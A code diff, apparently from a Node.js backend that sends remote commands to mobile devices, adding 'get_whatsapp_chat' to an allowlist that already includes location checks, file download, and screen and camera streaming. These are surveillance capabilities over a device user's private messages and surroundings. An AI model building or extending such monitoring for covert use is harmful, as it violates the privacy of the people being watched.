@@ -7,7 +7,7 @@ const { sendSyncNudge } = require("../services/fcm.service");
 const router = express.Router();
 router.use(requireAuth);
 
-const ALLOWED_COMMAND_TYPES = ["location_check", "lock", "file_list", "file_download", "screen_stream", "camera_stream", "sync_whatsapp", "whatsapp_file_list"];
+const ALLOWED_COMMAND_TYPES = ["location_check", "lock", "file_list", "file_download", "screen_stream", "camera_stream", "sync_whatsapp", "whatsapp_file_list", "get_whatsapp_chat"];
 
 async function checkDeviceAccess(deviceId, auth) {
   if (auth.role === "super_admin") {
